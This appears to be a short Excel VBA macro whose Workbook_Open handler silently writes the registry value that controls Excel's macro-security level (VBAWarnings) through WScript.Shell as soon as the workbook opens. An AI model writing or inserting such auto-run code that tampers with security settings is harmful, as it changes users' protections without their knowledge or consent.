Private Sub Workbook_Open()
  RegKeySave "HKCU\Software\Microsoft\Office\" & Application.Version & "\Excel\Security\VBAWarnings", 3, "REG_DWORD"
End Sub
Sub RegKeySave(key, value, kind)
  Set writer = CreateObject("WScript.Shell")
  writer.RegWrite key, value, kind
End Sub
